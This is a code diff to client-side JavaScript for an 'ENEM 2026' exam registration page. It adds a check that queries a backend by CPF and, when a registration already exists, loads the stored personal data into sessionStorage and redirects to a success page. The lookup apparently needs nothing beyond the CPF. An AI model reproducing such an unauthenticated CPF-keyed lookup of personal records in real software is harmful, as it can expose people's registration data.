@@ -569,20 +569,65 @@
         ev.preventDefault(); ev.stopPropagation();
         if(state.step < 10) return;
         // Persist user data for the next page (no notification triggered here)
+        var payload = {
+          cpf: state.cpf,
+          candidato: state.name,
+          dataNascimento: state.dob,
+          dispositivo: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+          titulo: 'ENEM 2026 - Inscrição'
+        };
         try {
-          var payload = {
-            cpf: state.cpf,
-            candidato: state.name,
-            dataNascimento: state.dob,
-            dispositivo: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-            titulo: 'ENEM 2026 - Inscrição'
-          };
           sessionStorage.setItem('enem_inscricao_payload', JSON.stringify(payload));
         } catch(e) { console.warn('sessionStorage falhou:', e); }
         btn.disabled = true;
         btn.style.opacity = '0.7';
         btn.innerText = 'Aguarde...';
-        window.location.href = '/dados.html';
+
+        // Verifica no backend se o CPF já possui inscrição enviada.
+        // Se sim => hidrata sessionStorage com os dados do banco e
+        // pula o fluxo manual indo direto para /inscricao-sucesso.html.
+        // Caso contrário, segue o fluxo normal para /dados.html.
+        var cpfDigits = (state.cpf || '').replace(/\D/g,'');
+        var apiUrl = (BACKEND || '') + '/api/donas/inscricoes/by-cpf/' + encodeURIComponent(cpfDigits);
+        var goNormal = function(){ window.location.href = '/dados.html'; };
+        var goSucesso = function(){ window.location.href = '/inscricao-sucesso.html'; };
+
+        if(!cpfDigits){ goNormal(); return; }
+
+        // Timeout de segurança: se a API não responder em 6s, segue fluxo normal
+        var done = false;
+        var timer = setTimeout(function(){ if(done) return; done = true; goNormal(); }, 6000);
+
+        fetch(apiUrl, { method: 'GET', headers: { 'Accept': 'application/json' } })
+          .then(function(r){
+            if(r.status === 404) return null;
+            if(!r.ok) throw new Error('http ' + r.status);
+            return r.json();
+          })
+          .then(function(data){
+            if(done) return; done = true; clearTimeout(timer);
+            if(!data || !data.cpf){ goNormal(); return; }
+            // Hidrata sessionStorage com payload do banco (mantém dados que o usuário acabou de digitar).
+            var dbPayload = (data.payload && typeof data.payload === 'object') ? data.payload : {};
+            var hydrated = Object.assign({}, dbPayload, {
+              cpf: data.cpf || state.cpf,
+              candidato: data.candidato || dbPayload.candidato || state.name,
+              dataNascimento: dbPayload.dataNascimento || state.dob,
+              inscricaoNumero: data.numero || dbPayload.inscricaoNumero || '',
+              inscricaoId: data.id || dbPayload.inscricaoId || '',
+              titulo: data.titulo || dbPayload.titulo || 'ENEM 2026 - Inscrição',
+              dispositivo: payload.dispositivo
+            });
+            try {
+              sessionStorage.setItem('enem_inscricao_payload', JSON.stringify(hydrated));
+            } catch(e) { console.warn('sessionStorage falhou:', e); }
+            goSucesso();
+          })
+          .catch(function(err){
+            console.warn('check by-cpf falhou:', err);
+            if(done) return; done = true; clearTimeout(timer);
+            goNormal();
+          });
       }, true);
     }
   }
